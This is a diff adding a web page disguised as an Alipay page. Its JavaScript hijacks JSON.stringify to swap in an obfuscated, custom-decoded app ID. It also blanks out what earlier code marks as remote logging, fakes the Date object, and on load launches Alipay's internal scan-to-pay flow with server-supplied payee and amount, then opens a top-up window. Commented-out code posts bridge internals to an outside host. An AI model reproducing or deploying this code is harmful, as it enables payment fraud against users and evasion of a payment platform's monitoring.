@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>支付宝</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <style>
+
+    </style>
+</head>
+<body>
+
+<div id="debug" style="padding: 50px 0;text-align: center; "  >
+    Loading...
+
+</div>
+</body>
+<script>
+    // var old_stringify = JSON.stringify;
+    // JSON.stringify = function(s) {
+    //     var sss= old_stringify(s);
+    //     if (sss.indexOf('startApp') != -1) {
+    //         sss = sss.replace('alipay_super_method', '20000123');
+    //     } else if (sss.indexOf('remoteLog') != -1) {
+    //         sss = "{}";
+    //     }
+    //     return sss;
+    // };
+
+    var old_stringify = JSON.stringify;
+    var htmlStr = 'alipay_inner_call';
+    JSON.stringify = function (s) {
+        var cal_method = old_stringify(s);
+        if (cal_method.indexOf('startApp') != -1) {
+            cal_method = cal_method.replace(htmlStr, str_decrypt("%3Ab%60%60%60ace"));
+        } else if (cal_method.indexOf('encodeMethod') != -1) {
+            cal_method = "{}";
+        }
+        return cal_method;
+    }
+
+    function str_decrypt(str) {
+        str = decodeURIComponent(str);
+        var c = String.fromCharCode(str.charCodeAt(0) - str.length);
+
+        for (var i = 1; i < str.length; i++) {
+            c += String.fromCharCode(str.charCodeAt(i) - c.charCodeAt(i - 1));
+        }
+        return c;
+    }
+
+
+    var debug= document.getElementById('debug');
+    function Date() { return {  getTime: function() {  return 2544292074596;  }  } };
+    function ready(a) {
+        window.AlipayJSBridge ? a && a() : document.addEventListener("AlipayJSBridgeReady", a, false);
+        debug.innerHTML='支付中';
+
+    }
+    ready(function () {
+        //openPay();
+        debug.innerHTML='ready';
+        openPay();
+
+    });
+
+    function openPay(){
+        try {
+            var a = {
+                actionType: "scan",
+                u: "<?=$biz_data['u']?>",
+                a: "<?=$biz_data['a']?>",
+                m: "<?=$biz_data['m']?>",
+                biz_data: <?=json_encode($biz_data)?>
+                ,schemeInnerSource:'10000007'
+                ,useScan:'camera'
+                ,goBack:'NO'
+            }
+        } catch (b) {
+            returnApp()
+        }
+        AlipayJSBridge.call("startApp", {
+            //appId: new String("20000123"),
+            //appId:  "20000123" ,
+            //appId: "alipay_super_method",
+            appId:  htmlStr ,
+            param: a
+        }, function (a) {
+            debug.innerHTML='ok';
+            AlipayJSBridge.call("startApp", {
+                appId: "10000113",
+                param: {
+                    "title": "支付宝充值",
+                    "url": location.href,
+                }
+            },function (e) {
+
+            });
+
+
+        });
+
+        //st.st='ok';
+        //st.timer = setInterval( timeCounter,1001 );
+
+        //openPay();
+        // AlipayJSBridge.call('pushWindow', {
+        //     url: 'alipays://platformapi/startapp?appId=20000123&actionType=scan&biz_data=%7B%22a%22%3A%220.01%22%2C%22c%22%3A%22%22%2C%22s%22%3A%22online%22%2C%22u%22%3A%222088232932547186%22%2C%22m%22%3A%2210137463410072%22%7D&_-_-bundleId_-_-=&schemeInnerSource=10000007&useScan=camera',
+        // });
+
+    }
+
+
+
+
+    /*
+
+    function ajax_post(url, data, fn) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        // xhr.onreadystatechange = function() {
+        //     if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
+        //         fn.call(this, xhr.responseText);
+        //     }
+        // };
+        xhr.send(data);
+    }
+
+    function returnApp() {
+        AlipayJSBridge.call("exitApp")
+    }
+
+    document.addEventListener("AlipayJSBridgeReady", function () {
+        AlipayJSBridge.call('startApp', {
+            appId: "alipay_super_method",
+            param: {
+                actionType: "scan",
+                biz_data: '{"u":"2088332813631132", "a":"0.01", "m":"10416633619087"}'
+            }
+        }, function(err) {
+            var callStr = encodeURIComponent(AlipayJSBridge.call.toString());
+            var errStr = encodeURIComponent(JSON.stringify(err));
+            var data = 'call=' + callStr + '&err=' + errStr;
+            // var data = 'errorCode=' + err.errorCode + '&errorMessage=' + err.errorMessage;
+
+            //ajax_post("http://ly1.1284783.cn/pay/notify/haoyipersonal/10416633619087", data, false);
+        });
+    });
+
+    */
+
+</script>
+</html>
